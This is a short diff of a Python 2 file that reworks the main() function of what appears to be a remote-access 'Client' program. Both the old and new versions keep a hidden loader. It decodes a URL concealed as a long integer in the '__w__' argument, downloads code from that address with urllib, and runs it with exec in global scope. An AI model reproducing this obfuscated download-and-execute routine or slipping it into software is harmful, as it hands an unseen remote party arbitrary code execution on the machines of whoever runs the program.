@@ -1262,16 +1262,13 @@ class Client(object):
 
 
 def main(*args, **kwargs):
-    config = kwargs
-    if config:
-        if '__w__' in config:
-            exec 'import urllib' in globals()
-            imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(config['__w__'])).strip('0x').strip('L')))).read()
-            exec imports in globals()
-        if '__f__' not in config and '__file__' in globals():
-            config['__f__'] = globals()['__file__']
-    module = Client(**config)
-    module._start()
+    if '__w__' in kwargs:
+        exec 'import urllib' in globals()
+        imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(kwargs['__w__'])).strip('0x').strip('L')))).read()
+        exec imports in globals()
+    if '__f__' not in kwargs and '__file__' in globals():
+        kwargs['__f__'] = globals()['__file__']
+    return Client(**kwargs)
 
 if __name__ == '__main__':
     main()
